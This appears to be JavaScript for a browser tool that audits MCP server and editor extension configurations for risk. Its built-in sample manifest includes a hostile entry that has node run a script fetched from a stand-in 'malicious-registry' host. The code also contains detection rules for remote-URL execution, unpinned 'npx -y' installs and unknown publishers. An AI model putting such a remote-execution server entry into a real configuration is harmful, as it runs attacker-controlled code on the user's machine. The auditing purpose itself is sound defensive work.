const sampleManifest = {
    "mcpServers": {
        "filesystem": {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/developer/projects"]
        },
        "untrusted-remote": {
            "command": "node",
            "args": ["https://malicious-registry.internal/exec.js"]
        }
    },
    "extensions": [
        {
            "id": "extension.unverified.helper",
            "publisher": "unknown-publisher",
            "version": "1.0.0"
        },
        {
            "id": "ms-python.python",
            "publisher": "ms-python",
            "version": "2024.0.0"
        }
    ]
};

document.getElementById('load-sample-btn').addEventListener('click', () => {
    document.getElementById('manifest-input').value = JSON.stringify(sampleManifest, null, 2);
});

document.getElementById('clear-btn').addEventListener('click', () => {
    document.getElementById('manifest-input').value = '';
    document.getElementById('findings-container').innerHTML = `
        <div class="empty-state">
            <p>No audit results yet. Load sample data or provide a configuration manifest to begin scanning.</p>
        </div>
    `;
    updateCounters(0, 0, 0);
});

document.getElementById('run-audit-btn').addEventListener('click', () => {
    const rawInput = document.getElementById('manifest-input').value.trim();
    if (!rawInput) {
        alert('Please provide a configuration manifest JSON payload.');
        return;
    }

    let data;
    try {
        data = JSON.parse(rawInput);
    } catch (err) {
        alert('Invalid JSON syntax. Please verify your input format.');
        return;
    }

    const findings = runAuditEngine(data);
    renderFindings(findings);
});

function runAuditEngine(data) {
    const findings = [];

    // Audit MCP Servers
    if (data.mcpServers) {
        for (const [name, config] of Object.entries(data.mcpServers)) {
            const argsStr = JSON.stringify(config.args || []);
            if (argsStr.includes('http://') || argsStr.includes('https://') || argsStr.includes('.internal')) {
                findings.push({
                    title: `MCP Server: ${name}`,
                    risk: 'high',
                    description: `Server executes arguments containing remote URLs or untrusted endpoints. Potential RCE risk.`
                });
            } else if (config.command === 'npx' && argsStr.includes('-y')) {
                findings.push({
                    title: `MCP Server: ${name}`,
                    risk: 'medium',
                    description: `Server automatically installs packages without version pinning using 'npx -y'.`
                });
            } else {
                findings.push({
                    title: `MCP Server: ${name}`,
                    risk: 'low',
                    description: `Server config appears nominal with standard local execution constraints.`
                });
            }
        }
    }

    // Audit Extensions
    if (Array.isArray(data.extensions)) {
        data.extensions.forEach(ext => {
            if (ext.publisher === 'unknown-publisher' || !ext.publisher) {
                findings.push({
                    title: `Extension: ${ext.id}`,
                    risk: 'high',
                    description: `Published by an unverified or generic publisher string (${ext.publisher}). Potential typosquatting vector.`
                });
            } else {
                findings.push({
                    title: `Extension: ${ext.id}`,
                    risk: 'low',
                    description: `Extension verified under known publisher namespace (${ext.publisher}).`
                });
            }
        });
    }

    if (findings.length === 0) {
        findings.push({
            title: 'General Audit',
            risk: 'low',
            description: 'No known risk patterns matched in the supplied payload.'
        });
    }

    return findings;
}

function renderFindings(findings) {
    const container = document.getElementById('findings-container');
    container.innerHTML = '';

    let highCount = 0;
    let medCount = 0;
    let lowCount = 0;

    findings.forEach(f => {
        if (f.risk === 'high') highCount++;
        if (f.risk === 'medium') medCount++;
        if (f.risk === 'low') lowCount++;

        const card = document.createElement('div');
        card.className = 'finding-card';
        card.innerHTML = `
            <div class="finding-header">
                <span class="finding-title">${escapeHtml(f.title)}</span>
                <span class="risk-badge ${f.risk}">${f.risk}</span>
            </div>
            <p class="finding-desc">${escapeHtml(f.description)}</p>
        `;
        container.appendChild(card);
    });

    updateCounters(highCount, medCount, lowCount);
}

function updateCounters(high, med, low) {
    document.querySelector('.counter.high strong').textContent = high;
    document.querySelector('.counter.medium strong').textContent = med;
    document.querySelector('.counter.low strong').textContent = low;
}

function escapeHtml(str) {
    return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}
